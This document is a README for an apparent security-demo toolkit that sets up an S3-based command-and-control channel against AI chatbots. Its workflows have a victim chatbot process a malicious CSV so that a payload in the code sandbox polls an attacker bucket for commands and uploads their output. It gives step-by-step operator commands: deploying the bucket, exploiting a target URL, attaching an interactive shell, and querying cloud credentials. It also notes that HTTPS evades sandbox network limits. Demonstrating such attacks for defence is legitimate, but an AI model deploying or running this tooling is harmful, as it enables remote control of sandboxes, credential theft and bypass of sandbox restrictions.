# Attacker Infrastructure — S3 C2 Channel

S3-based C2 server and attack tools for the S3 exfiltration security demo.

Unlike the DNS channel, this variant requires no EC2 server. The attacker's
S3 bucket acts as the C2 drop — the payload polls for commands via a
long-lived presigned GET URL and uploads output via per-command presigned
PUT URLs. All traffic uses standard HTTPS, which passes through most sandbox
network restrictions.

## Quick Start

```bash
# 1. Set up AWS profile
cp .env.example .env
# Edit .env to set AWS_PROFILE (or export it)

# 2. Install dependencies with uv
make setup

# 3. Deploy C2 infrastructure (creates S3 bucket + IAM policy)
make deploy

# 4. Run the full attack against a victim chatbot
make exploit TARGET=https://chatbot.victim.com

# 5. Attach to the C2 session
make connect-session
```

## Prerequisites

- [uv](https://docs.astral.sh/uv/getting-started/installation/) for Python dependency management
- AWS CLI configured
- Terraform

## Commands

### Deployment

| Command                   | Description                                      |
|---------------------------|--------------------------------------------------|
| `make setup`              | Install dependencies with uv                     |
| `make terraform-init`     | Initialize Terraform                             |
| `make terraform-plan`     | Preview changes                                  |
| `make terraform-apply`    | Apply changes (with confirmation)                |
| `make deploy`             | Full deploy: init + plan + apply + generate .env |
| `make env-from-terraform` | Generate .env from Terraform outputs             |

### Attack Operations

| Command                              | Description                                                |
|--------------------------------------|------------------------------------------------------------|
| `make exploit`                       | Generate payload + send to victim (reads `../.victim_url`) |
| `make exploit TARGET=<url>`          | Generate payload + send to specific victim URL             |
| `make demo`                          | Narrated exploit + auto-attach (for presentations)         |
| `make demo TARGET=<url>`             | Narrated exploit against a specific victim URL             |
| `make generate-csv`                  | Generate malicious CSV for manual upload via web UI        |
| `make connect-session`               | Attach to session from `.session_id` interactively         |
| `make connect-session SESSION=<id>`  | Attach to a specific session interactively                 |
| `make send CMD="<cmd>" SESSION=<id>` | Send a single command to a session                         |
| `make receive SESSION=<id>`          | Fetch output from a session                                |

### C2 Management

| Command         | Description                       |
|-----------------|-----------------------------------|
| `make check-s3` | Verify S3 C2 bucket is accessible |

### Testing

| Command     | Description   |
|-------------|---------------|
| `make test` | Run all tests |

### Cleanup

| Command                  | Description                                            |
|--------------------------|--------------------------------------------------------|
| `make clean`             | Remove `.venv`, build artifacts, `.env`, `.session_id` |
| `make terraform-destroy` | Destroy S3 bucket and IAM resources                    |
| `make destroy`           | Destroy infrastructure and clean local files           |

## Using the CLI Directly

```bash
uv run c2 --help                          # Show all commands

# Payload generation
uv run c2 generate-csv                    # Generate malicious CSV (auto session ID)
uv run c2 generate-csv -s sess_abc123     # Generate with a specific session ID
uv run c2 generate-csv -o attack.csv -q   # Write to custom file, print session ID only
uv run c2 generate-url -s sess_abc123     # Print the presigned poll URL for a session

# Full attack
uv run c2 exploit https://chatbot.victim.com
uv run c2 exploit https://chatbot.victim.com --narrate   # demo-friendly narration
uv run c2 exploit https://chatbot.victim.com --verbose

# Session interaction
uv run c2 attach sess_abc123              # Interactive operator shell
uv run c2 send "whoami" -s sess_abc123    # Send a command
uv run c2 receive -s sess_abc123 --seq 1  # Fetch output for seq=1
uv run c2 reset -s sess_abc123            # Reset session to idle
```

## Attack Workflows

### Option 1 — Automated (one command)

```bash
make exploit TARGET=https://chatbot.victim.com
make connect-session
```

### Option 2 — Manual CSV upload (web UI)

```bash
# Generate the payload file
make generate-csv

# Upload malicious_data_s3.csv to the victim chatbot's web UI
# Use the suggested prompt printed by the command above
# Wait ~15 seconds for the payload to execute

make connect-session
```

### Option 3 — Scripted session control

```bash
# Send a command and wait for output without the interactive shell
make send CMD="aws sts get-caller-identity" SESSION=sess_abc123
make receive SESSION=sess_abc123
```

## Architecture

```
Operator (local)          S3 C2 Bucket              Victim Sandbox
─────────────────         ─────────────────         ─────────────────
AttackClient          →   sessions/{id}/cmd     ←   payload polls via
write_command()           (command JSON)             presigned GET URL

AttackClient          ←   sessions/{id}/out/{n} ←   payload uploads via
read_output()             (command output)           presigned PUT URL
```

### S3 Key Layout

| Key | Content | Written by |
|-----|---------|------------|
| `sessions/{id}/cmd` | `{"seq": N, "cmd": "...", "response_put_url": "..."}` | Operator |
| `sessions/{id}/out/{N}` | Raw command output text | Payload |

Idle state resets `cmd` to `{"seq": 0, "cmd": null}`.

### Sequence Numbers

Each command has a monotonically increasing `seq` number. The payload skips
any command whose `seq` is not greater than the last executed `seq`, preventing
re-execution on repeated polls.

### S3 Protocol

```
Operator                    S3 Bucket                   Payload (in sandbox)
   │                            │                               │
   │  write_command(seq=1)      │                               │
   │──────────────────────────► │                               │
   │                            │                               │
   │                            │◄──── GET sessions/id/cmd ──── │
   │                            │      (presigned URL)          │
   │                            │                               │
   │                            │──── {"seq":1,"cmd":"..."}────►│
   │                            │                               │
   │                            │                    execute()  │
   │                            │                               │
   │                            │◄──── PUT sessions/id/out/1 ── │
   │                            │      (presigned URL)          │
   │                            │                               │
   │  read_output(seq=1)        │                               │
   │◄────────────────────────── │                               │
```
